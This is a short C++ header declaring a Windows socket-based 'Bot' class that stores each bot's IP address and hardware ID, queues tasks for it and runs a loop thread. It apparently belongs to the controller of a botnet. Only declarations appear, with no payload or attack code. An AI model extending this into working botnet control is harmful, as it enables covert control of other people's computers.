#pragma once

#include <WinSock2.h>
#include <queue>
#include <string>
#include <thread>

#include "../Communication/Packet.h"
#include "../Task/Task.h"
#include "../Util/Variable.h"
#include "BotHandler.h"

class Bot {
private:
  SOCKET BotSocket;
  std::string BotIP;
  std::string HWID;
  std::queue<class Task *> TaskQueue;
  std::thread LoopingThread;

  bool isSuccessResponse(char *Payload);

  bool stopLoop = false;
  void loopingThread();

public:
  Bot(SOCKET Socket, std::string IP, std::string HWID) {
    this->BotSocket = Socket;
    this->BotIP = IP;
    this->HWID = HWID;
  }

  void startLooping();

  SOCKET *getBotSocket();
  std::string getBotIP();
  std::string getHWID();

  void addTaskQueue(Task *NewTask);
};
